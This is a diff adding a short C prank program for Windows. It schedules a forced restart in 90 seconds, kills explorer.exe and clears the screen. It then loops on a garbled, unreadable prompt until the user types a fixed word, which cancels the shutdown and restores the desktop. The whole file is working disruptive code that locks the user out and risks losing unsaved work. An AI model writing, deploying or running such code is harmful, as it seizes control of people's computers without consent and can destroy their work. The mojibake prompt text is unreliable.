@@ -1,0 +1,20 @@
+#include<stdio.h>
+#include<string.h>
+#include<stdlib.h>
+main()
+{
+ char a[12],b[12]={"shi"};
+ system("shutdown -r -t 90");
+ system("taskkill/im explorer.exe /f");
+ system("cls");
+    v: printf("ƒ„ «÷Ì£®¥Ú∆¥“Ù£©?\n");
+ scanf("%s",a);
+ if(strcmp(a,b)==0)
+ {
+  system("shutdown -a");
+  system("explorer.exe");
+  
+  
+ }
+ else goto v;
+}
